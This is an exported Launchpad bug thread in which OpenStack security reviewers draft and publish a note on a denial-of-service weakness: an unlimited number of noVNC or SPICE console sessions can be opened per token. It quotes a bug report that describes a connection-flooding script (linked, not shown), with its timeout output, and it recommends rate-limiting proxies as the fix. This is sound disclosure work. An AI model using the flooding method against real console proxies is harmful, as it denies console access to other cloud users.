            "content": "https://wiki.openstack.org/wiki/OSSN/1227575\nNathan and Sriram ..\nI read the bug report and it mentions noVNC and SPICE, so I incorporated both in the messaging.\nWorried that I may have blotched the OSSN. More do I wish it was it git/gerrit.\n\nHowever .. need some clarification ..\n\nPer http://docs.openstack.org/trunk/config-reference/content/getting-started-with-vnc-proxy.html\n\n\nWhich is the entity that becomes unresponsive?\n1) The noVNC Proxy host?  (the middle wheel in bottom that hosts the Nova console auth)\nOr\n2) The compute node, top right?\n\n\nWhat is meant by \"no amplification\" ?\nThat means damage is limited right, then answer should be (2) above.\nBut if it is two, each compute node would need to be listed and rate limited?\n", 
            "date_created": "2014-03-08 02:04:55.292510+00:00", 
            "author": "https://api.launchpad.net/1.0/~malini-k-bhandaru"
        }, 
        {
            "content": "@malini-k-bhandaru\n> I read the bug report and it mentions noVNC and SPICE, so I incorporated both in the messaging.\n\nGood call.  I've adjusted some wording slightly, but the additions you made look good overall.\n\n> Which is the entity that becomes unresponsive?\n> 1) The noVNC Proxy host? (the middle wheel in bottom that hosts the Nova console auth)\n> Or\n> 2) The compute node, top right?\n\nThe responsiveness of the nova-novncproxy service is what we are most concerned about.  It is true that a host running nova-compute compute node has to deal with the incoming VNC connections as well, but there are usually many compute nodes and instances are balanced across them.  If the nova-novncproxy service is the bottleneck, then the compute node itself won't become non-responsive.\n\n> What is meant by \"no amplification\" ?\n\nAs I understand it, it's a when the volume of traffic in an attack is amplified.  This typically involves getting many other services to reflect traffic at the target.  For a real world example, lookup \"smurf attack\".\n\n> That means damage is limited right, then answer should be (2) above.\n\nIt's not limited (which is the main issue here).  It just means it's not amplified.  That is, the attacker needs to be able to open enough connections themself to overcome the resources of the system running nova-novncproxy.\n\n> But if it is two, each compute node would need to be listed and rate limited?\n\nAs I mentioned above, the nova-novncproxy service is the main concern.  It wouldn't hurt to mention that a compute node could be affected too.  I've just added this to the note draft on the wiki.\n", 
            "date_created": "2014-03-08 03:59:13.607950+00:00", 
            "author": "https://api.launchpad.net/1.0/~nkinder"
        }, 
        {
            "content": "Here's an updated OSSN draft that covers all of the issues mentioned in my previous comment (in the appropriate e-mail format).  I also removed the reference to rate-limiting in the Security Guide, as it doesn't actually contain any information on how to do rate limiting.  It only mentioned that QOSaaS plans to offer rate limiting, which isn't applicable here.\n\nIf this looks fine to everyone else, I'll go ahead and publish it.\n\n-----------------------------------------------------------------------------------------\nDoS style attack on noVNC server can lead to service interruption or disruption\n---\n\n### Summary ###\nThere is currently no limit on the number of noVNC or SPICE console\nsessions that can be established against a single user token. This\nenables launching a Denial of Service (DoS) style attack by establishing\nmany console sessions against a single virtual machine instance through\nthe console proxy. This can cause instance access timeouts and general\nservice response degradation on the console host.\n\n### Affected Services / Software ###\nHorizon, Nova, noVNC proxy, SPICE console, Grizzly, Havana\n\n### Discussion ###\nCurrently with a single user token, no restrictions are enforced on the\nnumber or frequency of noVNC or SPICE console sessions that may be\nestablished.  While a user can only access their own virtual machine\ninstances, resources can be exhausted on the console proxy host by\ncreating an excessive number of simultaneous console sessions.  This can\nresult in timeouts for subsequent connection requests to instances using\nthe same console proxy.  Not only would this prevent the user from\naccessing their own instances, but other legitimate users would also be\ndeprived of console access.  Further, other services running on the\nnoVNC proxy and Compute hosts may degrade in responsiveness.\n\nBy taking advantage of this lack of restrictions around noVNC or SPICE\nconsole connections, a single user could cause the console proxy\nendpoint to become unresponsive, resulting in a Denial Of Service (DoS)\nstyle attack.  It should be noted that there is no amplification effect.\n\n### Recommended Actions ###\nFor current stable OpenStack releases (Grizzly, Havana), users need to\nworkaround this vulnerability by using rate-limiting proxies to cover\naccess to the noVNC proxy service.  Rate-limiting is a common mechanism\nto prevent DoS and Brute-Force attacks.\n\nFor example, if you are using a proxy such as Repose, enable the rate\nlimiting feature by following these steps:\n\n  https://repose.atlassian.net/wiki/display/REPOSE/Rate+Limiting+Filter\n\nFuture OpenStack releases are looking to add the ability to restrict\nnoVNC and SPICE console connections.\n\n### Contacts / References ###\nThis OSSN : https://wiki.openstack.org/wiki/OSSN/OSSN-0008\nOriginal LaunchPad Bug : https://bugs.launchpad.net/nova/+bug/1227575\nOpenStack Security ML : <email address hidden>\nOpenStack Security Group : https://launchpad.net/~openstack-ossg", 
            "date_created": "2014-03-08 04:23:28.545396+00:00", 
            "author": "https://api.launchpad.net/1.0/~nkinder"
        }, 
        {
            "content": "+1\nI totally like it.\nGlad you added that last line on how we expect to handle it in future release.\n\n-----Original Message-----\nFrom: Nathan Kinder [mailto:<email address hidden>] \nSent: Friday, March 07, 2014 8:23 PM\nTo: <email address hidden>\nSubject: [Openstack-security] [Bug 1227575] Re: DoS style attack on noVNC server can lead to service interruption or disruption\n\nHere's an updated OSSN draft that covers all of the issues mentioned in my previous comment (in the appropriate e-mail format).  I also removed the reference to rate-limiting in the Security Guide, as it doesn't actually contain any information on how to do rate limiting.  It only mentioned that QOSaaS plans to offer rate limiting, which isn't applicable here.\n\nIf this looks fine to everyone else, I'll go ahead and publish it.\n\n-----------------------------------------------------------------------------------------\nDoS style attack on noVNC server can lead to service interruption or disruption\n---\n\n### Summary ###\nThere is currently no limit on the number of noVNC or SPICE console sessions that can be established against a single user token. This enables launching a Denial of Service (DoS) style attack by establishing many console sessions against a single virtual machine instance through the console proxy. This can cause instance access timeouts and general service response degradation on the console host.\n\n### Affected Services / Software ###\nHorizon, Nova, noVNC proxy, SPICE console, Grizzly, Havana\n\n### Discussion ###\nCurrently with a single user token, no restrictions are enforced on the number or frequency of noVNC or SPICE console sessions that may be established.  While a user can only access their own virtual machine instances, resources can be exhausted on the console proxy host by creating an excessive number of simultaneous console sessions.  This can result in timeouts for subsequent connection requests to instances using the same console proxy.  Not only would this prevent the user from accessing their own instances, but other legitimate users would also be deprived of console access.  Further, other services running on the noVNC proxy and Compute hosts may degrade in responsiveness.\n\nBy taking advantage of this lack of restrictions around noVNC or SPICE console connections, a single user could cause the console proxy endpoint to become unresponsive, resulting in a Denial Of Service (DoS) style attack.  It should be noted that there is no amplification effect.\n\n### Recommended Actions ###\nFor current stable OpenStack releases (Grizzly, Havana), users need to workaround this vulnerability by using rate-limiting proxies to cover access to the noVNC proxy service.  Rate-limiting is a common mechanism to prevent DoS and Brute-Force attacks.\n\nFor example, if you are using a proxy such as Repose, enable the rate limiting feature by following these steps:\n\n  https://repose.atlassian.net/wiki/display/REPOSE/Rate+Limiting+Filter\n\nFuture OpenStack releases are looking to add the ability to restrict noVNC and SPICE console connections.\n\n### Contacts / References ###\nThis OSSN : https://wiki.openstack.org/wiki/OSSN/OSSN-0008\nOriginal LaunchPad Bug : https://bugs.launchpad.net/nova/+bug/1227575\nOpenStack Security ML : <email address hidden>\nOpenStack Security Group : https://launchpad.net/~openstack-ossg\n\n--\nYou received this bug notification because you are a member of OpenStack Security Group, which is subscribed to OpenStack.\nhttps://bugs.launchpad.net/bugs/1227575\n\nTitle:\n  DoS style attack on noVNC server can lead to service interruption or\n  disruption\n\nStatus in OpenStack Compute (Nova):\n  In Progress\nStatus in OpenStack Security Notes:\n  New\n\nBug description:\n  There is no limiting on the number of VNC sessions that can be created for a single user's VNC token.\n  Any attempt to create multiple (say hundreds or thousands) of websocket connections to the VNC server\n  results in many connection timeouts. Due to these connection timeout error, other users trying to access their\n  VM's VNC console cannot do so.\n\n  A sample script that tries to create 100,000 connections to Nova noVNC proxy, shows timeout errors\n  Script: http://paste.openstack.org/show/47254/\n\n  Script output.... connections get timed out after a while\n  -------------------\n  ....\n  ..\n\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  --------------------\n\n  Impact:\n  1. Many of the sessions timeout. Any attempt to open other sessions also intermittently fail.\n  This can cause serious problems to users already having a running VNC session or trying to create new sessions.\n\n  2. The overall performance and response times of other nova services running on the novnc host, using tcp protocol\n  also gets affected after the connection timeout errors.\n\n  For example:\n  Before running the sumulate thousands of connections program:\n  $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n  +-------+---------------------------------------------------------------------------------+\n  | Type  | Url                                                                             |\n  +-------+---------------------------------------------------------------------------------+\n  | novnc | http://10.2.3.102:6080/vnc_auto.html?token=e776dd33-422f-4b56-9f98-e317410d0212 |\n  +-------+---------------------------------------------------------------------------------+\n\n  real    0m0.751s\n  user    0m0.376s\n  sys     0m0.084s\n\n  rohit@precise-dev-102:~/tools/websocket-client-0.7.0$\n\n  After running the program, the response time is quite high:\n  $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n\n  +-------+---------------------------------------------------------------------------------+\n  | Type  | Url                                                                             |\n  +-------+---------------------------------------------------------------------------------+\n  | novnc | http://10.2.3.102:6080/vnc_auto.html?token=6865d675-d852-478b-b1ee-457b092f11b9 |\n  +-------+---------------------------------------------------------------------------------+\n\n  real    3m9.231s\n  user    0m0.424s\n  sys     0m0.108s\n\n  \n  Possible solutions:\n  1. Allow just 1 session per instance, and raise a new exception, say, VNCSessionAlreadyExists to reject multiple\n  connections for the same token, and return an error code to the user.\n  2. Make the number of sessions allowed per instance configurable, limited by some count of sessions.\n\n  However, both of these solutions may need to override and modify the do_proxy() method of websockify's WebSocketProxy class,\n  which can lead to maintenance issues.\n\n  Another possible solution would be to implement some kind of callback function in websockify, to which we can pass the token\n  for reconnection. This would first need contribution to the websockify project code, and then update Nova.\n\nTo manage notifications about this bug go to:\nhttps://bugs.launchpad.net/nova/+bug/1227575/+subscriptions\n\n_______________________________________________\nOpenstack-security mailing list\n<email address hidden>\nhttp://lists.openstack.org/cgi-bin/mailman/listinfo/openstack-security\n", 
            "date_created": "2014-03-08 05:34:09+00:00", 
            "author": "https://api.launchpad.net/1.0/~malini-k-bhandaru"
        }, 
        {
            "content": "Thanks Nathan, good to publish!\n\n-----Original Message-----\nFrom: \"Nathan Kinder\" <email address hidden>\nSent: \u200e3/\u200e7/\u200e2014 8:33 PM\nTo: \"<email address hidden>\" <email address hidden>\nSubject: [Openstack-security] [Bug 1227575] Re: DoS style attack on noVNCserver can lead to service interruption or disruption\n\nHere's an updated OSSN draft that covers all of the issues mentioned in\nmy previous comment (in the appropriate e-mail format).  I also removed\nthe reference to rate-limiting in the Security Guide, as it doesn't\nactually contain any information on how to do rate limiting.  It only\nmentioned that QOSaaS plans to offer rate limiting, which isn't\napplicable here.\n\nIf this looks fine to everyone else, I'll go ahead and publish it.\n\n-----------------------------------------------------------------------------------------\nDoS style attack on noVNC server can lead to service interruption or disruption\n---\n\n### Summary ###\nThere is currently no limit on the number of noVNC or SPICE console\nsessions that can be established against a single user token. This\nenables launching a Denial of Service (DoS) style attack by establishing\nmany console sessions against a single virtual machine instance through\nthe console proxy. This can cause instance access timeouts and general\nservice response degradation on the console host.\n\n### Affected Services / Software ###\nHorizon, Nova, noVNC proxy, SPICE console, Grizzly, Havana\n\n### Discussion ###\nCurrently with a single user token, no restrictions are enforced on the\nnumber or frequency of noVNC or SPICE console sessions that may be\nestablished.  While a user can only access their own virtual machine\ninstances, resources can be exhausted on the console proxy host by\ncreating an excessive number of simultaneous console sessions.  This can\nresult in timeouts for subsequent connection requests to instances using\nthe same console proxy.  Not only would this prevent the user from\naccessing their own instances, but other legitimate users would also be\ndeprived of console access.  Further, other services running on the\nnoVNC proxy and Compute hosts may degrade in responsiveness.\n\nBy taking advantage of this lack of restrictions around noVNC or SPICE\nconsole connections, a single user could cause the console proxy\nendpoint to become unresponsive, resulting in a Denial Of Service (DoS)\nstyle attack.  It should be noted that there is no amplification effect.\n\n### Recommended Actions ###\nFor current stable OpenStack releases (Grizzly, Havana), users need to\nworkaround this vulnerability by using rate-limiting proxies to cover\naccess to the noVNC proxy service.  Rate-limiting is a common mechanism\nto prevent DoS and Brute-Force attacks.\n\nFor example, if you are using a proxy such as Repose, enable the rate\nlimiting feature by following these steps:\n\n  https://repose.atlassian.net/wiki/display/REPOSE/Rate+Limiting+Filter\n\nFuture OpenStack releases are looking to add the ability to restrict\nnoVNC and SPICE console connections.\n\n### Contacts / References ###\nThis OSSN : https://wiki.openstack.org/wiki/OSSN/OSSN-0008\nOriginal LaunchPad Bug : https://bugs.launchpad.net/nova/+bug/1227575\nOpenStack Security ML : <email address hidden>\nOpenStack Security Group : https://launchpad.net/~openstack-ossg\n\n-- \nYou received this bug notification because you are a member of OpenStack\nSecurity Group, which is subscribed to OpenStack.\nhttps://bugs.launchpad.net/bugs/1227575\n\nTitle:\n  DoS style attack on noVNC server can lead to service interruption or\n  disruption\n\nStatus in OpenStack Compute (Nova):\n  In Progress\nStatus in OpenStack Security Notes:\n  New\n\nBug description:\n  There is no limiting on the number of VNC sessions that can be created for a single user's VNC token.\n  Any attempt to create multiple (say hundreds or thousands) of websocket connections to the VNC server\n  results in many connection timeouts. Due to these connection timeout error, other users trying to access their \n  VM's VNC console cannot do so.\n\n  A sample script that tries to create 100,000 connections to Nova noVNC proxy, shows timeout errors\n  Script: http://paste.openstack.org/show/47254/\n\n  Script output.... connections get timed out after a while\n  -------------------\n  ....\n  ..\n\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  Received 'RFB 003.008\n  '\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  Creating Connection\n  Receiving...\n  timed out\n  --------------------\n\n  Impact:\n  1. Many of the sessions timeout. Any attempt to open other sessions also intermittently fail.\n  This can cause serious problems to users already having a running VNC session or trying to create new sessions.\n\n  2. The overall performance and response times of other nova services running on the novnc host, using tcp protocol\n  also gets affected after the connection timeout errors.\n\n  For example:\n  Before running the sumulate thousands of connections program:\n  $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n  +-------+---------------------------------------------------------------------------------+\n  | Type  | Url                                                                             |\n  +-------+---------------------------------------------------------------------------------+\n  | novnc | http://10.2.3.102:6080/vnc_auto.html?token=e776dd33-422f-4b56-9f98-e317410d0212 |\n  +-------+---------------------------------------------------------------------------------+\n\n  real    0m0.751s\n  user    0m0.376s\n  sys     0m0.084s\n\n  rohit@precise-dev-102:~/tools/websocket-client-0.7.0$\n\n  After running the program, the response time is quite high:\n  $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n\n  +-------+---------------------------------------------------------------------------------+\n  | Type  | Url                                                                             |\n  +-------+---------------------------------------------------------------------------------+\n  | novnc | http://10.2.3.102:6080/vnc_auto.html?token=6865d675-d852-478b-b1ee-457b092f11b9 |\n  +-------+---------------------------------------------------------------------------------+\n\n  real    3m9.231s\n  user    0m0.424s\n  sys     0m0.108s\n\n  \n  Possible solutions:\n  1. Allow just 1 session per instance, and raise a new exception, say, VNCSessionAlreadyExists to reject multiple\n  connections for the same token, and return an error code to the user.\n  2. Make the number of sessions allowed per instance configurable, limited by some count of sessions.\n\n  However, both of these solutions may need to override and modify the do_proxy() method of websockify's WebSocketProxy class, \n  which can lead to maintenance issues.\n\n  Another possible solution would be to implement some kind of callback function in websockify, to which we can pass the token\n  for reconnection. This would first need contribution to the websockify project code, and then update Nova.\n\nTo manage notifications about this bug go to:\nhttps://bugs.launchpad.net/nova/+bug/1227575/+subscriptions\n\n_______________________________________________\nOpenstack-security mailing list\n<email address hidden>\nhttp://lists.openstack.org/cgi-bin/mailman/listinfo/openstack-security\n", 
            "date_created": "2014-03-08 06:02:43+00:00", 
            "author": "https://api.launchpad.net/1.0/~sriramhere"
        }, 
        {
            "content": "The OSSN looks great, but I think perhaps the summary could be tweaked to be a little shorter and maybe flow a little better\u2026\r\n\r\nThere is currently no limit to the number of noVNC or SPICE console sessions that can be established by a single user. The console host has limited resources and an attacker launching many sessions may be able to exhaust the available resources, resulting in a Denial of Service (DoS) condition.\r\n\r\nOther than that it\u2019s hot-to-trot, as they say.\r\n\r\n-Rob\r\n\r\nFrom: Sriram Subramanian [mailto:<email address hidden>]\r\nSent: 08 March 2014 06:03\r\nTo: Bug 1227575; <email address hidden>\r\nSubject: Re: [Openstack-security] [Bug 1227575] Re: DoS style attack on noVNCserver can lead to service interruption or disruption\r\n\r\nThanks Nathan, good to publish!\r\n________________________________\r\nFrom: Nathan Kinder<mailto:<email address hidden>>\r\nSent: \u200e3/\u200e7/\u200e2014 8:33 PM\r\nTo: <email address hidden><mailto:<email address hidden>>\r\nSubject: [Openstack-security] [Bug 1227575] Re: DoS style attack on noVNCserver can lead to service interruption or disruption\r\nHere's an updated OSSN draft that covers all of the issues mentioned in\r\nmy previous comment (in the appropriate e-mail format).  I also removed\r\nthe reference to rate-limiting in the Security Guide, as it doesn't\r\nactually contain any information on how to do rate limiting.  It only\r\nmentioned that QOSaaS plans to offer rate limiting, which isn't\r\napplicable here.\r\n\r\nIf this looks fine to everyone else, I'll go ahead and publish it.\r\n\r\n-----------------------------------------------------------------------------------------\r\nDoS style attack on noVNC server can lead to service interruption or disruption\r\n---\r\n\r\n### Summary ###\r\nThere is currently no limit on the number of noVNC or SPICE console\r\nsessions that can be established against a single user token. This\r\nenables launching a Denial of Service (DoS) style attack by establishing\r\nmany console sessions against a single virtual machine instance through\r\nthe console proxy. This can cause instance access timeouts and general\r\nservice response degradation on the console host.\r\n\r\n### Affected Services / Software ###\r\nHorizon, Nova, noVNC proxy, SPICE console, Grizzly, Havana\r\n\r\n### Discussion ###\r\nCurrently with a single user token, no restrictions are enforced on the\r\nnumber or frequency of noVNC or SPICE console sessions that may be\r\nestablished.  While a user can only access their own virtual machine\r\ninstances, resources can be exhausted on the console proxy host by\r\ncreating an excessive number of simultaneous console sessions.  This can\r\nresult in timeouts for subsequent connection requests to instances using\r\nthe same console proxy.  Not only would this prevent the user from\r\naccessing their own instances, but other legitimate users would also be\r\ndeprived of console access.  Further, other services running on the\r\nnoVNC proxy and Compute hosts may degrade in responsiveness.\r\n\r\nBy taking advantage of this lack of restrictions around noVNC or SPICE\r\nconsole connections, a single user could cause the console proxy\r\nendpoint to become unresponsive, resulting in a Denial Of Service (DoS)\r\nstyle attack.  It should be noted that there is no amplification effect.\r\n\r\n### Recommended Actions ###\r\nFor current stable OpenStack releases (Grizzly, Havana), users need to\r\nworkaround this vulnerability by using rate-limiting proxies to cover\r\naccess to the noVNC proxy service.  Rate-limiting is a common mechanism\r\nto prevent DoS and Brute-Force attacks.\r\n\r\nFor example, if you are using a proxy such as Repose, enable the rate\r\nlimiting feature by following these steps:\r\n\r\n  https://repose.atlassian.net/wiki/display/REPOSE/Rate+Limiting+Filter\r\n\r\nFuture OpenStack releases are looking to add the ability to restrict\r\nnoVNC and SPICE console connections.\r\n\r\n### Contacts / References ###\r\nThis OSSN : https://wiki.openstack.org/wiki/OSSN/OSSN-0008\r\nOriginal LaunchPad Bug : https://bugs.launchpad.net/nova/+bug/1227575\r\nOpenStack Security ML : <email address hidden><mailto:<email address hidden>>\r\nOpenStack Security Group : https://launchpad.net/~openstack-ossg\r\n\r\n--\r\nYou received this bug notification because you are a member of OpenStack\r\nSecurity Group, which is subscribed to OpenStack.\r\nhttps://bugs.launchpad.net/bugs/1227575\r\n\r\nTitle:\r\n  DoS style attack on noVNC server can lead to service interruption or\r\n  disruption\r\n\r\nStatus in OpenStack Compute (Nova):\r\n  In Progress\r\nStatus in OpenStack Security Notes:\r\n  New\r\n\r\nBug description:\r\n  There is no limiting on the number of VNC sessions that can be created for a single user's VNC token.\r\n  Any attempt to create multiple (say hundreds or thousands) of websocket connections to the VNC server\r\n  results in many connection timeouts. Due to these connection timeout error, other users trying to access their\r\n  VM's VNC console cannot do so.\r\n\r\n  A sample script that tries to create 100,000 connections to Nova noVNC proxy, shows timeout errors\r\n  Script: http://paste.openstack.org/show/47254/\r\n\r\n  Script output.... connections get timed out after a while\r\n  -------------------\r\n  ....\r\n  ..\r\n\r\n  Creating Connection\r\n  Receiving...\r\n  Received 'RFB 003.008\r\n  '\r\n  Creating Connection\r\n  Receiving...\r\n  Received 'RFB 003.008\r\n  '\r\n  Creating Connection\r\n  Receiving...\r\n  Received 'RFB 003.008\r\n  '\r\n  Creating Connection\r\n  Receiving...\r\n  Received 'RFB 003.008\r\n  '\r\n  Creating Connection\r\n  Receiving...\r\n  Received 'RFB 003.008\r\n  '\r\n  Creating Connection\r\n  Receiving...\r\n  Received 'RFB 003.008\r\n  '\r\n  Creating Connection\r\n  Receiving...\r\n  timed out\r\n  Creating Connection\r\n  Receiving...\r\n  timed out\r\n  Creating Connection\r\n  Receiving...\r\n  timed out\r\n  Creating Connection\r\n  Receiving...\r\n  timed out\r\n  Creating Connection\r\n  Receiving...\r\n  timed out\r\n  --------------------\r\n\r\n  Impact:\r\n  1. Many of the sessions timeout. Any attempt to open other sessions also intermittently fail.\r\n  This can cause serious problems to users already having a running VNC session or trying to create new sessions.\r\n\r\n  2. The overall performance and response times of other nova services running on the novnc host, using tcp protocol\r\n  also gets affected after the connection timeout errors.\r\n\r\n  For example:\r\n  Before running the sumulate thousands of connections program:\r\n  $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\r\n  +-------+---------------------------------------------------------------------------------+\r\n  | Type  | Url                                                                             |\r\n  +-------+---------------------------------------------------------------------------------+\r\n  | novnc | http://10.2.3.102:6080/vnc_auto.html?token=e776dd33-422f-4b56-9f98-e317410d0212 |\r\n  +-------+---------------------------------------------------------------------------------+\r\n\r\n  real    0m0.751s\r\n  user    0m0.376s\r\n  sys     0m0.084s\r\n\r\n  rohit@precise-dev-102:~/tools/websocket-client-0.7.0$<mailto:rohit@precise-dev-102:~/tools/websocket-client-0.7.0$>\r\n\r\n  After running the program, the response time is quite high:\r\n  $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\r\n\r\n  +-------+---------------------------------------------------------------------------------+\r\n  | Type  | Url                                                                             |\r\n  +-------+---------------------------------------------------------------------------------+\r\n  | novnc | http://10.2.3.102:6080/vnc_auto.html?token=6865d675-d852-478b-b1ee-457b092f11b9 |\r\n  +-------+---------------------------------------------------------------------------------+\r\n\r\n  real    3m9.231s\r\n  user    0m0.424s\r\n  sys     0m0.108s\r\n\r\n\r\n  Possible solutions:\r\n  1. Allow just 1 session per instance, and raise a new exception, say, VNCSessionAlreadyExists to reject multiple\r\n  connections for the same token, and return an error code to the user.\r\n  2. Make the number of sessions allowed per instance configurable, limited by some count of sessions.\r\n\r\n  However, both of these solutions may need to override and modify the do_proxy() method of websockify's WebSocketProxy class,\r\n  which can lead to maintenance issues.\r\n\r\n  Another possible solution would be to implement some kind of callback function in websockify, to which we can pass the token\r\n  for reconnection. This would first need contribution to the websockify project code, and then update Nova.\r\n\r\nTo manage notifications about this bug go to:\r\nhttps://bugs.launchpad.net/nova/+bug/1227575/+subscriptions\r\n\r\n_______________________________________________\r\nOpenstack-security mailing list\r\n<email address hidden><mailto:<email address hidden>>\r\nhttp://lists.openstack.org/cgi-bin/mailman/listinfo/openstack-security\r\n", 
            "date_created": "2014-03-08 20:47:53+00:00", 
            "author": "https://api.launchpad.net/1.0/~robert-clark"
        }, 
        {
            "content": "I've adjusted the \"Summary\" section as suggested by Rob.  I've gone ahead and published the following OSSN to the following locations:\n\n  https://wiki.openstack.org/wiki/OSSN/OSSN-0008\n  <email address hidden>\n  <email address hidden>\n\nThanks everyone for the reviews and contributions to this OSSN!\n\n--------------------------------------------------------------------------\nDoS style attack on noVNC server can lead to service interruption or disruption\n---\n\n### Summary ###\nThere is currently no limit to the number of noVNC or SPICE console\nsessions that can be established by a single user. The console host has\nlimited resources and an attacker launching many sessions may be able to\nexhaust the available resources, resulting in a Denial of Service (DoS)\ncondition.\n\n### Affected Services / Software ###\nHorizon, Nova, noVNC proxy, SPICE console, Grizzly, Havana\n\n### Discussion ###\nCurrently with a single user token, no restrictions are enforced on the\nnumber or frequency of noVNC or SPICE console sessions that may be\nestablished.  While a user can only access their own virtual machine\ninstances, resources can be exhausted on the console proxy host by\ncreating an excessive number of simultaneous console sessions.  This can\nresult in timeouts for subsequent connection requests to instances using\nthe same console proxy.  Not only would this prevent the user from\naccessing their own instances, but other legitimate users would also be\ndeprived of console access.  Further, other services running on the\nnoVNC proxy and Compute hosts may degrade in responsiveness.\n\nBy taking advantage of this lack of restrictions around noVNC or SPICE\nconsole connections, a single user could cause the console proxy\nendpoint to become unresponsive, resulting in a Denial Of Service (DoS)\nstyle attack.  It should be noted that there is no amplification effect.\n\n### Recommended Actions ###\nFor current stable OpenStack releases (Grizzly, Havana), users need to\nworkaround this vulnerability by using rate-limiting proxies to cover\naccess to the noVNC proxy service.  Rate-limiting is a common mechanism\nto prevent DoS and Brute-Force attacks.\n\nFor example, if you are using a proxy such as Repose, enable the rate\nlimiting feature by following these steps:\n\n  https://repose.atlassian.net/wiki/display/REPOSE/Rate+Limiting+Filter\n\nFuture OpenStack releases are looking to add the ability to restrict\nnoVNC and SPICE console connections.\n\n### Contacts / References ###\nThis OSSN : https://wiki.openstack.org/wiki/OSSN/OSSN-0008\nOriginal LaunchPad Bug : https://bugs.launchpad.net/nova/+bug/1227575\nOpenStack Security ML : <email address hidden>\nOpenStack Security Group : https://launchpad.net/~openstack-ossg", 
            "date_created": "2014-03-09 16:55:41.987886+00:00", 
            "author": "https://api.launchpad.net/1.0/~nkinder"
        }, 
        {
            "content": "I have spice enabled in my havana environment and am using spice-html5proxy to connect to the spice server.\nIf I use an URL with same token multiple times, previous connection drops and only last session stays active.\n\nOld tab shows \"Error: Unexpected close while ready\" in console.log under spice console on the browser.\nAnd latest tab has active connection to the spice server.\n\nHere is what I see in qemu logs, when I use same token again to connect to the server - \n\nred_client_destroy: destroy client with #channels 4\nred_dispatcher_disconnect_display_peer: \nred_channel_client_disconnect: 0x7f42302a81a0 (channel 0x7f423021d0b0 type 2 id 0)\nred_channel_client_disconnect: 0x7f42302a81a0 (channel 0x7f423021d0b0 type 2 id 0)\nred_channel_client_disconnect: 0x7f42714a1dc0 (channel 0x7f4270efc460 type 3 id 0)\nred_channel_client_disconnect: 0x7f42714a1dc0 (channel 0x7f4270efc460 type 3 id 0)\nred_dispatcher_disconnect_cursor_peer: \nred_channel_client_disconnect: 0x7f42302660c0 (channel 0x7f423021d670 type 4 id 0)\nred_channel_client_disconnect: 0x7f42302660c0 (channel 0x7f423021d670 type 4 id 0)\nred_channel_client_disconnect: 0x7f42714740f0 (channel 0x7f4270ef2770 type 1 id 0)\nmain_channel_client_on_disconnect: rcc=0x7f42714740f0\nred_channel_client_disconnect: 0x7f42714740f0 (channel 0x7f4270ef2770 type 1 id 0)\nmain_channel_link: add main channel client\nmain_channel_handle_parsed: net test: latency 19.735000 ms, bitrate 25127601 bps (23.963548 Mbps)\nred_dispatcher_set_cursor_peer: \ninputs_connect: inputs channel client create\n\n\nSo, does this mean that I am using certain qemu configuration (I do not see any) which does not allow to share connections?\nIf qemu is not allowing multiple clients connecting to spice server, will I still see the DoS attack?\n\n\n\n\n", 
            "date_created": "2014-03-13 18:16:46.774788+00:00", 
            "author": "https://api.launchpad.net/1.0/~meghalgosalia"
        }, 
        {
            "content": "Meghal: It looks like in the libvirt.xml of the instance, you are using sharePolicy=allow-exclusive in graphics element.\nNot sure though if you can specify this parameter for spice console graphics.\n \nCan you please share libvirt.xml of the instance if possible?", 
            "date_created": "2014-03-13 19:31:15.863163+00:00", 
            "author": "https://api.launchpad.net/1.0/~tpatil"
        }, 
        {
            "content": "Here is the libvirt.xml of the instance:\n\n<domain type=\"kvm\">\n  <uuid>5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380</uuid>\n  <name>instance-00000095</name>\n  <memory>524288</memory>\n  <vcpu>1</vcpu>\n  <sysinfo type=\"smbios\">\n    <system>\n      <entry name=\"manufacturer\">OpenStack Foundation</entry>\n      <entry name=\"product\">OpenStack Nova</entry>\n      <entry name=\"version\">2013.2.2</entry>\n      <entry name=\"serial\">cbcaa281-fe93-11d5-b186-80c16e7d4ce0</entry>\n      <entry name=\"uuid\">5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380</entry>\n    </system>\n  </sysinfo>\n  <os>\n    <type>hvm</type>\n    <kernel>/var/nova/instances/5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380/kernel</kernel>\n    <initrd>/var/nova/instances/5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380/ramdisk</initrd>\n    <cmdline>root=/dev/vda console=tty0 console=ttyS0</cmdline>\n    <smbios mode=\"sysinfo\"/>\n  </os>\n  <features>\n    <acpi/>\n    <apic/>\n  </features>\n  <clock offset=\"utc\">\n    <timer name=\"pit\" tickpolicy=\"delay\"/>\n    <timer name=\"rtc\" tickpolicy=\"catchup\"/>\n  </clock>\n  <devices>\n    <disk type=\"file\" device=\"disk\">\n      <driver name=\"qemu\" type=\"qcow2\" cache=\"none\"/>\n      <source 